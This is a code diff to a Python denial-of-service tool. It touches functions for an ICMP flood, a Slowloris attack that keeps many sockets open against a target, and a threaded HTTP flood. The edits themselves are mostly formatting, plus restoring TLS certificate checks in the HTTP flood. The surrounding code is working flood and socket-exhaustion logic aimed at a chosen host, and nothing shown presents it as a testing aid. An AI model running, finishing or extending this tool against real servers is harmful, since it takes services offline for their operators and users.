@@ -5,6 +5,7 @@ import ssl
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
+
 import scapy.error
 from colorama import init
 from rich.logging import RichHandler
@@ -105,7 +106,7 @@ def icmp_flood(target_ip, count=100):
             if (i + 1) % report_every == 0 or i == count - 1:
                 log.info(f"ICMP FLOOD - Sent {sent}/{count} packets")
         except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
-                    log.error(f"ICMP Flood error: {e}")
+            log.error(f"ICMP Flood error: {e}")
         except Exception as e:
             log.error(f"ICMP Flood error: {e}")
 
@@ -131,12 +132,14 @@ def create_socket(target_host, target_port, idx, sockets, log):
         log.critical(f"SLOWLORIS - Unexpected error for {idx}: {e}")
     return False
 
+
 def replenish_sockets(sockets, target_host, target_port, num_sockets, log):
     current_count = len(sockets)
     if current_count < num_sockets:
         for idx in range(current_count, num_sockets):
             if create_socket(target_host, target_port, idx, sockets, log):
                 log.info(f"SLOWLORIS - Replenished socket {idx+1}/{num_sockets}")
+
 
 def send_on_sockets(sockets, log):
     dead_sockets = []
@@ -150,6 +153,7 @@ def send_on_sockets(sockets, log):
             dead_sockets.append(s)
     return dead_sockets
 
+
 def cleanup_sockets(dead_sockets, sockets):
     for s in dead_sockets:
         if s in sockets:
@@ -158,6 +162,7 @@ def cleanup_sockets(dead_sockets, sockets):
                 s.close()
             except:
                 pass
+
 
 def maintain_sockets(sockets, target_host, target_port, num_sockets, log):
     pkt_count = 0
@@ -201,7 +206,7 @@ def slowloris_attack(target_host, target_port, num_sockets=50):
             try:
                 s.close()
             except (socket.timeout, socket.error, scapy.error.Scapy_Exception) as e:
-                        log.error(f"SYN Flood error: {e}")
+                log.error(f"SYN Flood error: {e}")
         log.info(f"Slowloris attack finished on {target_host}:{target_port}")
 
 
@@ -244,8 +249,8 @@ def run_http_flood(target_url, packages, threads):
     ctx = None
     if parsed.scheme == "https":
         ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
+        ctx.check_hostname = True
+        ctx.verify_mode = ssl.CERT_REQUIRED
 
     base_count = packages // threads
     remainder = packages % threads
